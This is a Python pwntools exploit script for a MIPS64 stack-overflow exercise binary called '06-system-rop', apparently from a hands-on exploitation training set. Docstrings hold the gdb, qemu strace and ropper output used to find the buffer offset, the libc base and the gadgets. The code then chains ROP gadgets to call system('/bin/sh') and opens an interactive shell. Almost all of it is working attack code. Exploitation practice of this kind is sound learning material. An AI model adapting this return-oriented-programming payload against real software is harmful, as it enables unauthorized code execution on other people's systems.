#!/usr/bin/python

"""
(gdb) disassemble vulnerable
Dump of assembler code for function vulnerable:
   0x0000000120000b80 <+0>:	daddiu	sp,sp,-160
   0x0000000120000b84 <+4>:	sd	ra,152(sp)
...
   0x0000000120000bf8 <+120>:	ld	ra,152(sp)
   0x0000000120000bfc <+124>:	ld	s8,144(sp)
   0x0000000120000c00 <+128>:	ld	gp,136(sp)
   0x0000000120000c04 <+132>:	daddiu	sp,sp,160
   0x0000000120000c08 <+136>:	jr	ra
   0x0000000120000c0c <+140>:	nop
End of assembler dump.
(gdb) b vulnerable 
Breakpoint 1 at 0x120000ba0: file src/06-system-rop.c, line 6.
(gdb) b *0x0000000120000bf8
Breakpoint 2 at 0x120000bf8: file src/06-system-rop.c, line 11.
(gdb) c
Continuing.

Breakpoint 1, vulnerable () at src/06-system-rop.c:6
6		printf("> ");
(gdb) p &buffer[0]
$1 = 0x40007ffd70 ""
(gdb) c
Continuing.

Breakpoint 2, 0x0000000120000bf8 in vulnerable () at src/06-system-rop.c:11
11	}
(gdb) p/x $sp+152
$2 = 0x40007ffe08
"""

"""
$ qemu-mips64 -L /usr/mips64-linux-gnuabi64/ -strace ./bin/mips64/06-system-rop
...
14024 openat(AT_FDCWD,"/lib/libc.so.6",O_RDONLY|O_CLOEXEC) = 3
...
14024 mmap(NULL,1880864,PROT_EXEC|PROT_READ,MAP_PRIVATE|MAP_DENYWRITE,3,0) = 0x000000400085e000
"""

"""
$ ropper --nocolor --file /usr/mips64-linux-gnuabi64/lib/libc-2.27.so
0x00000000000e941c: ld $ra, 0x28($sp); ld $s2, 0x18($sp); ld $s1, 0x10($sp); ld $s0, 8($sp); jr $ra; daddiu $sp, $sp, 0x30; 
0x0000000000050b34: move $t9, $s1; jalr $t9; ld $a0, 0x38($sp);
0x0000000000082824: move $t9, $s0; jalr $t9; nop; 
"""

import struct
import sys

from pwn import *

context(arch='mips64', os='linux', endian='big', word_size=64)

binary_path = './bin/mips64/06-system-rop'
libc_path = '/usr/mips64-linux-gnuabi64/lib/libc-2.27.so'

ra_saved_addr = 0x40007ffe08
buffer_addr = 0x40007ffd70
libc_addr = 0x000000400085e000

ld_s0_s1_addr = libc_addr + 0x00000000000e941c
ld_a0_sp_0x38_jump_s1_addr = libc_addr + 0x0000000000050b34
jump_s0_addr = libc_addr + 0x0000000000082824

libc = ELF(libc_path)
system_addr = libc_addr + libc.symbols['system']
bin_sh_addr = libc_addr + libc.search('/bin/sh\x00').next()

p = process(binary_path)
#p = gdb.debug([binary_path])

payload = ''
payload += 'a' * (ra_saved_addr - buffer_addr)
payload += p64(ld_s0_s1_addr)
payload += 'b' * 8
payload += p64(system_addr) # s0
payload += p64(jump_s0_addr) # s1
payload += p64(0) # s2
payload += 'c' * 8
payload += p64(ld_a0_sp_0x38_jump_s1_addr) # ra
payload += 'd' * 0x38
payload += p64(bin_sh_addr)

p.readuntil('> ')
p.write(payload)
p.interactive()
